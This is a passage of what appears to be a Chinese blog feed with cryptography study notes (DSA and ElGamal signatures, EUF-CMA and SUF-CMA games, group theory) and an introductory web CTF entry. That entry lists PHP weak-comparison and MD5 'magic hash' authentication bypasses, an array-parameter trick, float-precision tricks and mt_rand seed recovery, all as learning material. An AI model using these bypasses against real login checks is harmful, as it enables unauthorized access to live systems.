inline">\(q\)</span>是素数，所以k的逆元一定存在，所以这里的k&lt;p就行了，跟上面比少了一个<spanclass="math inline">\(gcd(k,p-1)\)</span>的条件</p><p>ElGamal签名方案g的阶是p-1</p><p>跟ElGamal签名方案的构造本质上是一样的，不过不再作用在<spanclass="math inline">\(Z_p^*\)</span>，而是它的一个子群中</p><p><span class="math display">\[ElGamal签名方案：r=g^k\ mod\ p，s=k^{-1}(H(m)-xr)\ mod\p-1，0&lt;k&lt;p-1\\数字签名标准(DSA):r=(g^k\ mod\ p )\ mod\ q，s=k^{-1}(H(m)+xr)\ mod\q，0&lt;k&lt;q\]</span> <span class="math inline">\(Z_p^* ，*\modp，ElGamal签名方案种，g是这个群的生成元\)</span></p><p><strong>DSS算法的详细解释（简单易懂版）</strong></p><p><strong>（1）DSS算法的主要参数：</strong></p><ol type="1"><li><p>全局公开密钥分量：</p><ul><li>素数p, <span class="math inline">\(2 ^ {511} &lt; p &lt; 2 ^{512}\)</span>；</li><li>q是(p-1)的一个素因子, <span class="math inline">\(2^{159} &lt; q&lt; 2^{160}\)</span>；</li><li><span class="math inline">\(g=h ^ {[(p-1)/q]} mod p\)</span>,其中h是一整数，<span class="math inline">\(1&lt;h&lt;(p-1)\)</span></li></ul></li><li><p>私钥：</p><p>私钥x是随机或伪随机整数, 其中<spanclass="math inline">\(0&lt;x&lt;q\)</span>；</p></li><li><p>公钥：</p><p><span class="math inline">\(y=g ^ x mod p\)</span>，<spanclass="math inline">\(（p，q，g，y）\)</span>为公钥；</p></li><li><p>用户的随机选择数：</p><p>k为随机或伪随机整数, 其中<spanclass="math inline">\(0&lt;k&lt;q\)</span></p></li></ol><p><strong>（2）DSS的签名过程：</strong></p><p><span class="math inline">\(r=(g ^ k \mod p) \modq\)</span>，这里又mod q，再做了一次压缩，这是跟ElGamal最大的差别</p><p><span class="math inline">\(s=[k ^ {-1} (H(M)-xr)] \modq\)</span></p><p>形成了对信息M的数字签名(r,s)，数字签名和信息M一同发送给接收方。接收方接收到信息M’和数字签名(r’,s’)后，对数字签名的验证过程如下：</p><p><span class="math inline">\(w=(s’) ^ {-1} \mod q\)</span></p><p><span class="math inline">\(u1=[H(M’)w] \mod q,\)</span></p><p><span class="math inline">\(u2=( r’) w \mod q\)</span></p><p><span class="math inline">\(v=[(g ^ {u1} y ^ {u2}) \mod p] \modq\)</span></p><p>如果 <span class="math inline">\(v=r’\)</span>，则说明信息确实来自发送方。</p><p><strong>lai：</strong></p><p><span class="math inline">\(k=s^{-1}(H(m)+xr)\mod q\)</span></p><p>g的阶是q</p><p><spanclass="math inline">\(g^k=g^{s^{-1}(H(m)+xr)}=g^{s^{-1}H(m)+s^{-1}xr}=g^{s^{-1}H(m)}*y^{s^{-1}r}\mod p \mod q\)</span></p><p>看<span class="math inline">\(g^{s^{-1}H(m)}*y^{s^{-1}r} \mod p \modq\)</span>是否等于r</p><h3 id="dss签名的正确性">DSS签名的正确性</h3><p>因为 <span class="math inline">\((u_{1}+ xu_{2}) \mod q= ( H( m) +xr) s^{- 1} \mod q= k\)</span></p><p>所以：</p><p><span class="math display">\[\begin{align}&amp;g^{u_1}y^{u_2} \mod\ p  \mod\ q\\&amp;= g^{u_1}g^{xu_2} \mod p \mod q\\&amp;= g^{u_1+ xu_2} \mod p \mod q\\&amp;= g^{k} \mod p \mod q，这一步是为什么呢？\\&amp;=r\\\end{align}\]</span></p><p>上面的问题，我是这样想的：</p><p>其实就是同余的基本性质</p><p>若<span class="math inline">\((u_{1}+ xu_{2}) \mod q= k\)</span></p><p>则<span class="math inline">\(g^{u_1+ xu_2} \mod p \mod q= g^{k} \modp \mod q\)</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948010.png"alt="同余的基本性质" /><figcaption aria-hidden="true">同余的基本性质</figcaption></figure><blockquote><p>从群的角度来看，其实ElGamal和DSA是一样的，但是在计算r的时候又modq，如果不mod q的话，其实两个方案就是一样的</p></blockquote><h2 id="签名的安全模型">签名的安全模型</h2><h3 id="euf-cma">EUF-CMA</h3><blockquote><p>或EU-CMA，选择消息攻击下的存在性不可伪造：Existential Unforgeabilityunder Chosen Messagge Attack</p></blockquote><p>这一模型中的CMA指Chosen MessageAttack，即选择消息攻击，本质上与CPA其实是一样的，只不过在数字签名等算法中，用消息一词要比明文更加贴切。CMA和CPA都是形容敌手能自由地向算法提交输入并获得的相应输出这一能力。</p><p><strong>意思就是：你可以要任何消息的签名，但是你不能造出一个一样的签名</strong></p><p>EUF则是指存在性不可伪造，即 ExistentialUnForgeability，指的是对于消息认证、数字签名等算法而言，当敌手通过查询获得了q 个签名后， 他无法再获得第 q+1个签名。这一Game的示意图如下所示：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948036.png"alt="EUF-CMA示意图" /><figcaption aria-hidden="true">EUF-CMA示意图</figcaption></figure><p>可以看到，其基本形式依然和前文的模型保持相似，在查询阶段，敌手 <spanclass="math inline">\(\mathcal{A}\)</span> 可不断与一实现了签名Oracle的<span class="math inline">\(\mathcal{C}\)</span> 交互，来获得所提交消息<span class="math inline">\(m\)</span> 的签名 <spanclass="math inline">\(\sigma\)</span> 。在进行 <spanclass="math inline">\(q\)</span> 次交互后，敌手将输出一对 <spanclass="math inline">\(\left(m^*, \sigma^*\right)\)</span>。这一Game的主要步骤为:</p><ol type="1"><li>Game中拥有一具有多项式资源的敌手 <spanclass="math inline">\(\mathcal{A}\)</span>和一个能自由调用签名算法oracle <span class="math inline">\(E\)</span>的挑战者 <span class="math inline">\(\mathcal{C}\)</span> 。</li><li><span class="math inline">\(\mathcal{C}\)</span> 随机选取 <spanclass="math inline">\(sk\stackrel{\$}{\leftarrow}\{0,1\}^n\)</span>，作为签名算法的私钥</li><li><span class="math inline">\(\mathcal{A}\)</span> 向 <spanclass="math inline">\(\mathcal{C}\)</span> 提交消息 <spanclass="math inline">\(m, \mathcal{C}\)</span> 得到 <spanclass="math inline">\(m\)</span> 对应的签名 <spanclass="math inline">\(\sigma\)</span></li><li>重复步骤 <span class="math inline">\(3 q\)</span> 次 (即敌手查询<span class="math inline">\(q\)</span> 次不同消息的签名)</li><li><span class="math inline">\(\mathcal{A}\)</span> 输出一对 <spanclass="math inline">\(\left(m^*, \sigma^*\right)\)</span>;</li><li><span class="math inline">\(\mathcal{C}\)</span> 对 <spanclass="math inline">\(\sigma^*\)</span> 进行验证，并返回验证结果；</li></ol><p>若最后敌手输出的 <span class="math inline">\(m^*\)</span>未曾被查询过，且 <span class="math inline">\(\sigma^*\)</span>能通过验证，就可认为敌手挑战成功。这一结果即为“签名的伪造”，此处敌手的优势可写为: <span class="math display">\[\operatorname{Adv}_S^{\text {EUF-CMA}}(\mathcal{A})=\operatorname{Pr}\left[\mathcal{A} \text { forges}\left(m^*, \sigma^*\right)\right]\]</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948100.png"alt="EUF-CMA游戏描述" /><figcaption aria-hidden="true">EUF-CMA游戏描述</figcaption></figure><p><ahref="https://crypto.stackexchange.com/questions/44188/what-do-the-signature-security-abbreviations-like-euf-cma-mean">terminology- What do the signature security abbreviations like EUF-CMA mean? -Cryptography Stack Exchange</a></p><h3 id="suf-cma">SUF-CMA</h3><blockquote><p>或SU-CMA，选择消息攻击下的强不可伪造性：Strong Unforgeability underChosen Messagge Attack</p></blockquote><p>在EUF-CMA中，E表示的是Existential，而此处的SUF的S则表示Strong，即强不可伪造性，这一Game的基本模型如下图所示。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160948094.png"alt="SUF-CMA示意图" /><figcaption aria-hidden="true">SUF-CMA示意图</figcaption></figure><p>与EUF-CMA相比，SUF-CMA唯一的不同之处在于敌手最终输出伪造的签名对<span class="math inline">\((m^∗,σ^∗)\)</span>时，不仅要求 <spanclass="math inline">\(m^∗\)</span>是未曾查询过的，也要求签名<spanclass="math inline">\(σ^∗\)</span>是未曾出现过的。</p><p>因此，EUF-CMA这一Game中的敌手只需要寻找到 m 关于 σ的一个<strong>碰撞</strong>即可，而在SUF-CMA中，敌手的任务并不是要找碰撞，而是要从根本上伪造出一个签名消息对。</p><blockquote><p>总结一下：</p><p>这里的签名的安全模型规定的这些东西，对数字签名本身的功能来讲，功能不大，因为相当于你伪造了一个我的章发出去，可是我已经用我的章发出去了，你伪造一个跟我一样的章发出去，对我没影响，我消息发出去了（只是当成一个签名）</p><p>但是用数字签名方案构造其他东西的时候，会有用，也就是说可以把数字签名方案当成一个部件，去搭建更🐂🖊的功能</p></blockquote><ul><li>一个证明题</li></ul><p>以下两种证明的表述是一样的：</p><p>证明：如果一个数字签名方案，它的签名算法是一个确定性的算法，那么这个方案对EUF-CMA和SUF-CMA的安全性是一样的</p><p>证明：如果一个数字签名方案，它的签名算法是一个确定性的算法，它是EUF-CMA安全的，那么这个方案也是SUF-CMA的</p><p>我们讲的签名方案中，只有RSA是确定性的算法</p><p>因为<spanclass="math inline">\(SUF-CMA⟹EUF-CMA\)</span>是肯定成立的</p><p>上面的证明就是要证明：</p><p>如果一个签名方案其签名算法是确定性的算法，那么<spanclass="math inline">\(EUF-CMA⟹SUF-CMA\)</span></p><p>设存在<span class="math inline">\(SUF-CMA\)</span>敌手，构造一个<spanclass="math inline">\(EUF-CMA\)</span></p><p><span class="math display">\[\begin{align}&amp;有(m_1,σ_1),(m_2,σ_2),(m_3,σ_3),……,(m_q,σ_q)\\&amp;敌手已经找到了(m^*,σ^*),已经通过了验证，\\&amp;那么(m^*,σ^*)≠\{(m_1,σ_1),(m_2,σ_2),(m_3,σ_3),……,(m_q,σ_q)\}\\&amp;由签名方案其签名算法是确定性的算法，得m^*≠\{m_1,m_2,m_3,……,m_q\}\\&amp;其实这就结束了，这就相当于构造出了一个EUF-CMA\\&amp;\\\end{align}\]</span></p>]]></content>
    
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web-CTF-入门</title>
    <link href="/2024/04/19/Web-CTF-%E5%85%A5%E9%97%A8/"/>
    <url>/2024/04/19/Web-CTF-%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="php弱类型">PHP弱类型</h2><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p><p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则<strong>字符串会被转换成数值并且比较按照数值来进行</strong></p><p>==是不严格的等号</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">123</span><span class="hljs-keyword">abc</span> 会转成：<br><span class="hljs-number">123</span>（后面的就都舍弃了）<br><br><span class="hljs-number">123</span>a1231231321 会转成：<br><span class="hljs-number">123</span><br><br><span class="hljs-keyword">abc</span> 会转成：<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span> == <span class="hljs-number">0</span>);<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span> == <span class="hljs-number">1</span>);<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span> == <span class="hljs-number">1</span>)<span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span> == <span class="hljs-number">0</span>)<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span> == <span class="hljs-string">&quot;0e4456789&quot;</span>);<span class="hljs-comment">//true，e理解为科学计数法，0*e的n次方=0</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="哈希md5绕过问题">哈希（md5）绕过问题</h2><p>MD5 值就是一串 128 bit 的数据。</p><p>MD5 的核心是通过算法把任意长度的原始数据映射成128 bit 的数据</p><p>MD5 的特点：</p><p>不可逆性 --- 根据 MD5 值计算不出原始数据</p><p>唯一性 --- 不同原始数据会有不同的 MD5 值 （不完全可靠，后面说）</p><p><strong>一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串（字母大小写均可）</strong></p><p>第一关 登录的哈希验证</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span><br><span class="hljs-function"><span class="hljs-title">Md5</span><span class="hljs-params">(<span class="hljs-variable">$a</span>)</span></span> == <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$b</span>)<br><span class="hljs-string">&#x27;0e545993274517709034328855841020&#x27;</span> == <span class="hljs-string">&#x27;0e342768416822451524974117254469&#x27;</span> <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">常用的 MD5 碰撞有：<br>原值                 MD5<br>QNKCDZO          <span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br>s878926199a      <span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>s155964671a      <span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>s214587387a      <span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>s878926199a      <span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br></code></pre></td></tr></table></figure><p>第二关 登录的哈希验证 v2</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$a != $b<br>Md5($a) === md5($b)<br><br><span class="hljs-comment">//不能用弱类型了，但是可以用类型的污染</span><br><br><span class="hljs-built_in">null</span> === <span class="hljs-built_in">null</span><br>md5(<span class="hljs-built_in">array</span>) -&gt; <span class="hljs-built_in">null</span><br><br>XXXXX.com/?a<span class="hljs-meta">[</span><span class="hljs-meta">]</span>=1&amp;b<span class="hljs-meta">[</span><span class="hljs-meta">]</span>=2<br></code></pre></td></tr></table></figure><p>第三关 登录的哈希验证 v3</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(<span class="hljs-built_in">string</span>)$a != (<span class="hljs-built_in">string</span>)$b<br>md5($a) === md5($b)<br><br>md5碰撞 两个不同的东西拥有相同的md5:<br></code></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5碰撞的一些例子 -简书 (jianshu.com)</a></p><p><strong>一些拓展：</strong></p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">$<span class="hljs-built_in">md5</span> == <span class="hljs-built_in">md5</span>($<span class="hljs-built_in">md5</span>)  可以看成$a == <span class="hljs-built_in">md5</span>($a) <br>需要一个<span class="hljs-built_in">md5</span> 和 <span class="hljs-built_in">md5</span>(<span class="hljs-built_in">md5</span>)都是θe开头<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202404191704886.png"alt="md5 == md5(md5)" /><figcaption aria-hidden="true"><span class="math inline">\(md5 ==md5(\)</span>md5)</figcaption></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$a</span> == <span class="hljs-built_in">md5</span>(<span class="hljs-built_in">md5</span>(<span class="hljs-variable">$a</span>))<br><span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>e1138100474<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$numPositive</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) <span class="hljs-comment">//intval() 函数用于获取变量的整数值。</span><br><span class="hljs-variable">$numReverse</span> = <span class="hljs-title function_ invoke__">intrval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$num</span>)) <span class="hljs-comment">//strrev() 函数反转字符串。</span><br></code></pre></td></tr></table></figure><p>如果我们要求一个数字满足</p><p>①numPositive 等于 num，要求是一个整数（但是这样的话就不能满足②</p><p>②numPositive 等于 numReverse 并且 num不是回文序列：这里可以100.0010</p><p>所以我们可以用浮点精度来绕过，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">1.000000000000001</span> == <span class="hljs-number">1</span>);   <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">1.0000000000000001</span> == <span class="hljs-number">1</span>);  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">1.0000000000000001</span> === <span class="hljs-number">1</span>); <span class="hljs-comment">//false</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>num = 10000000000000000000.000000000000000000010</p><h2 id="变量覆盖">变量覆盖</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">用传参的值替换掉原有变量的值<br><span class="hljs-function"><span class="hljs-title">Extract</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Parse_str</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">Import_requests_variables</span><span class="hljs-params">()</span></span><span class="hljs-comment">//deprecated in php&gt;=5.4.0</span><br></code></pre></td></tr></table></figure><h2 id="随机数问题">随机数问题</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Mt_rand</span><span class="hljs-params">()</span></span>种子<br><span class="hljs-function"><span class="hljs-title">mt_rand</span><span class="hljs-params">()</span></span>函数用于生成随机数<br><span class="hljs-function"><span class="hljs-title">mt_srand</span><span class="hljs-params">(seed)</span></span>给随机数发生器播种<br></code></pre></td></tr></table></figure><p>爆破——死板，100题遇不到1题</p><p>[<a href="https://www.nssctf.cn/problem/258">GWCTF 2019]枯燥的抽奖 |NSSCTF</a></p><p>无需爆破：</p><p><ahref="https://www.anquanke.com/post/id/196831?display=mobile">无需暴破还原mt_rand()种子-安全客- 安全资讯平台 (anquanke.com)</a></p><p>遇到种子有时间限制的时候</p><blockquote><p>参考：</p><p><ahref="https://www.cnblogs.com/linfangnan/p/13411103.html">CTF-WEB：PHP弱类型 - 乌漆WhiteMoon - 博客园 (cnblogs.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学-2-数学引论</title>
    <link href="/2024/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E8%AE%BA-2-%E6%95%B0%E5%AD%A6/"/>
    <url>/2024/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E8%AE%BA-2-%E6%95%B0%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="数论基础知识">数论基础知识</h2><p><a href="https://oi-wiki.org/math/number-theory/basic/">数论基础 - OIWiki (oi-wiki.org)</a></p><p>定义5-1 (整除)：设<spanclass="math inline">\(a,b\)</span>是整数，<spanclass="math inline">\(a\neq b\)</span>，如果有一个整数<spanclass="math inline">\(x\)</span>，使得<spanclass="math inline">\(b=ax\)</span>，则<spanclass="math inline">\(b\)</span>叫做<spanclass="math inline">\(a\)</span>的倍数，<spanclass="math inline">\(a\)</span>叫做<spanclass="math inline">\(b\)</span>的因数，或者说<spanclass="math inline">\(a\)</span>能整除<spanclass="math inline">\(b\)</span>， 或<spanclass="math inline">\(b\)</span>能被<spanclass="math inline">\(a\)</span>整除。<spanclass="math inline">\(a\)</span>能整除<spanclass="math inline">\(b\)</span>,记为<spanclass="math inline">\(a|b\)</span></p><p>整除的性质：</p><ul><li>若<span class="math inline">\(a|b\)</span>，那么对任何整数<spanclass="math inline">\(c\)</span>，都有<spanclass="math inline">\(a|bc\)</span></li><li>若<span class="math inline">\(a|b，b|c\)</span>，那么有<spanclass="math inline">\(a|c\)</span></li><li>若<span class="math inline">\(a|b，a|c\)</span>，那么对任何整数 x 和y，都有<span class="math inline">\(a|(bx+cy);\)</span></li><li>若<span class="math inline">\(a|b，b|a\)</span>，那么<spanclass="math inline">\(a=\pm b\)</span></li><li>若<span class="math inline">\(a|b,a&gt;0,b&gt;0\)</span>，那么<spanclass="math inline">\(a\leq b.\)</span></li></ul><h3 id="群的相关概念">群的相关概念</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405160946105.png"alt="群的概念" /><figcaption aria-hidden="true">群的概念</figcaption></figure><p>对乘法，单位元是1，但是不是所有的整数都有逆元（或者说除了1和-1都没有=</p><p>逆元：对任意a，存在b，使得a * b=b * a=e，这里的b是逆元，e是单位元</p><p>群的阶：<spanclass="math inline">\(ord(G)=群中元素的个数\)</span></p><p>群元素的阶：<span class="math inline">\(ord(g)\)</span></p><ul><li>群元素g做群的操作 i 次</li><li>最小的正整数 i 满足，<spanclass="math inline">\(g^i=1\)</span>（单位元）</li></ul><p><span class="math inline">\(g^{ord(G)} =1(单位元)\)</span>，证明如下：</p><p><span class="math display">\[\begin{align}∵ord(g) \ &amp;|\ ord(G)\\g^{ord(g)} &amp;= 1\\∴ord(G) &amp;= k*ord(g)\\∴g^{ord(G)} &amp;= 1\end{align}\]</span></p><p>对$Z_n* $ ，{ a|gcd(a,N)=1 } *mod N，元素的个数为欧拉函数：φ(N)</p><p>当N为素数，{0,1,2,,,,,p-1} *mod p</p><p>例如p等于7时，$Z_n* <spanclass="math inline">\(为\)</span>{1,2,3,4,5,6}$，单位元：1</p><p>元素1-6的阶为：1，3，6，6（×）3（√），6，2</p><p>元素1的阶：<span class="math inline">\(1*1=1\)</span>，再mod 7 =1，所以元素1的阶为1</p><p>元素2的阶：<span class="math inline">\(2 * 2 * 2 = 8\)</span>，再mod7 =1，所以元素2的阶为3，写作：<spanclass="math inline">\(ord（2）=3\)</span></p><p>元素3的阶：<span class="math inline">\(3 * 3 * 3 * 3 * 3 * 3 =729\)</span>，再mod 7 = 1，所以元素3的阶为6</p><p>元素4的阶：<span class="math inline">\(4 * 4 * 4=64\)</span>，再mod 7= 1，所以元素4的阶为3</p><p>……</p><p>逆元（1-6的）：1，4，5，2，3，6</p><p>1的逆元：1 * 1 = 1，再mod 7 = 1，所以元素1的逆元为1</p><p>2的逆元：2 * 4 = 8，再mod 7 = 1，所以元素2的逆元为4</p><p>3的逆元：3 * 5 = 15，再mod 7 = 1，所以元素3的逆元为5</p><p>4的逆元：4 * 2 = 8，再mod 7 = 1，所以元素4的逆元为2</p><p>……</p><p>😴</p><p>对{0，1，2，3，，，，N-1} +mod N</p><p>是一个群</p><p>封闭性，结合律都满足</p><p>单位元：0</p><p>逆元：3的逆元N-3 （Zn）</p>]]></content>
    
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学-1-绪论</title>
    <link href="/2024/03/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E8%AE%BA-1-%E7%BB%AA%E8%AE%BA/"/>
    <url>/2024/03/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AF%BC%E8%AE%BA-1-%E7%BB%AA%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="密码学的发展概况">密码学的发展概况</h2><p>密码学是一门古老、年轻且深奥的学科。</p><p>密码学经历了从古典密码学到现代密码学的演变。</p><p>密码学是研究信息系统安全保密的科学。它包括密码编码学和密码分析学。</p><p>1949年前密码技术是一门技术性很强的艺术，而不是一门科学。</p><p>1949年shannon “保密系统的通信理论”，密码学成为科学。</p><p><strong>1976年Diffie和Hellman“密码学的新方向”，密码学的一场革命，标志着公钥密码学的出现</strong></p><p>1977年美国国家标准局公布DES，并公开算法，揭开神秘面纱。</p><h2 id="密码学的相关概念">密码学的相关概念</h2><p>密码学 (cryptology)：是密码编码学和密码分析学的统称</p><p>密码编码学(cryptography)：</p><ul><li>通过变换消息使其保密的科学和艺术</li><li>是密码理论的基础，也是保密系统设计的基础</li></ul><p>密码分析学(cryptanalysis)：在未知密钥的情况下从密文推演出明文或密钥的艺术</p><p>密码编码学和密码分析学既相互对立，又相互促进和发展</p><ul><li><p>明文</p><p>作为加密输入的原始信息，即消息的原始形式，通常用<spanclass="math inline">\(m\)</span> (message) 或<spanclass="math inline">\(p\)</span>(plaintext)表示。所有可能明文的有限集称为明文空间，通常用<spanclass="math inline">\(M\)</span>或<spanclass="math inline">\(P\)</span>表示。</p></li><li><p>密文</p><p>明文经加密变换后的结果，即消息被加密处理后的形式，通常用<spanclass="math inline">\(c\)</span>(ciphertext)表示。所有可能密文的有限集称为密文空间，通常用<spanclass="math inline">\(C\)</span>表示。</p></li><li><p>密钥</p><p>参与密码变换的参数，通常用<spanclass="math inline">\(k\)</span>(key)表示，包括加密密钥<spanclass="math inline">\(k_{e}\)</span>和解密秘钥<spanclass="math inline">\(k_d\)</span>。一切可能密钥构成的有限集称为密钥空间，通常用<spanclass="math inline">\(K\)</span>表示。</p></li><li><p>加密算法</p><p>将明文变换为密文的变换函数，相应的变换过程称为加密，即编码的过程。通常用<spanclass="math inline">\(E\)</span> (Encryption)表示，即<spanclass="math inline">\(c=\)</span> <spanclass="math inline">\(E_{k_e}(p)\)</span>。</p></li><li><p>解密算法</p><p>将密文恢复为明文的变换函数，相应的变换过程称为解密，即解码的过程。通常用<spanclass="math inline">\(D\left(\mathrm{Decryption}\right)\)</span>表示，即<spanclass="math inline">\(p=\)</span> <spanclass="math inline">\(D_{k_d}(c)\)</span></p></li></ul><p>密码学中的五元组<spanclass="math inline">\(\{P,C,K,E,D\}\)</span></p><p>对于明文空间<span class="math inline">\(P\)</span>中的每一个明文<spanclass="math inline">\(p\)</span>，加密算法<spanclass="math inline">\(E\)</span>在加密密钥<spanclass="math inline">\(k_{e}\)</span>的控制下将明文<spanclass="math inline">\(p\)</span>加密成密文<spanclass="math inline">\(c\)</span>；而解密算法<spanclass="math inline">\(D\)</span>则在解密密钥<spanclass="math inline">\(k_d\)</span>的控制下将密文<spanclass="math inline">\(c\)</span>解密成同一明文<spanclass="math inline">\(p\)</span> , 即：</p><p>对<span class="math inline">\(\forall p\in P,(k_e,k_d)\inK\)</span>，有<spanclass="math inline">\(p=D_{k_d}(E_{k_e}(p))\)</span></p><p>密码体制的组成：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403210842503.png"alt="密码体制的组成" /><figcaption aria-hidden="true">密码体制的组成</figcaption></figure><h3 id="密码分析分类">密码分析分类：</h3><p>根据密码分析者对明文、密文等信息掌握的多少</p><p>（1）唯密文攻击<span class="math inline">\((Ciphertext-onlyAttack)\)</span>：</p><ul><li>密码分析者仅知道一些密文。</li></ul><p>✓ 破译者已知：密码算法、待破译的密文</p><p>✓ 密码算法必须要能抵抗这类攻击，这是密码算法设计的最低要求</p><p>✓ 蛮力攻击 <span class="math inline">\((Brute-forceAttack)\)</span>：密码分析者测试所有可能的密钥来解密截获的密文，直到得到的明文看起来有意义。要对付这类攻击，可能的密钥数必须足够多。</p><p>✓ 统计攻击 <span class="math inline">\((StatisticalAttack)\)</span>：密码分析者分析明文语言的某些固有的内在属性（即统计特征），从而获得某种好处或利益。要对付这类攻击，密码算法必须要能隐藏明文语言的统计特征。</p><p>✓ 模式攻击 <span class="math inline">\((PatternAttack)\)</span>：密码分析者利用密文中形成的某些模式来实施攻击。要对付这类攻击，要求加密所得到的密文尽可能看起来像是随机的</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202403070939836.png"alt="唯密文攻击" /><figcaption aria-hidden="true">唯密文攻击</figcaption></figure><p>（2）已知明文攻击<span class="math 